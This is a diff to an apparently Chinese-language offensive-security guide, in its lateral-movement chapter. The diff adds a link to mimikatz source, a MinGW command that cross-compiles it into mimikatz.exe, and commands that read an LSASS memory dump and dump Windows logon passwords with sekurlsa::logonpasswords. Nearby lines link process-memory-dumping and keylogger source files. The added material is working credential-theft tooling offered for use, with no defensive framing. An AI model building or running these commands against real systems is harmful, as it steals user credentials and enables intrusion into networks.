@@ -431,6 +431,18 @@ cl /EHsc /D WIN32 /D _CONSOLE /D _UNICODE /D UNICODE .cpp文件 /link ws2_32.lib
 
 [指定进程内存抓取](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/指定进程内存抓取.cpp)
 
+[mimikatz](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/mimikatz.cpp)
+
+```bash
+x86_64-w64-mingw32-g++ -O2 mimikatz.cpp -o mimikatz.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive -ldbghelp
+```
+
+```bash
+.\mimikatz.exe
+sekurlsa::minidump c:\temp\lsass.dmp
+sekurlsa::logonpasswords
+```
+
 2. 键盘记录
 
 [键盘记录](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/键盘记录.cpp)
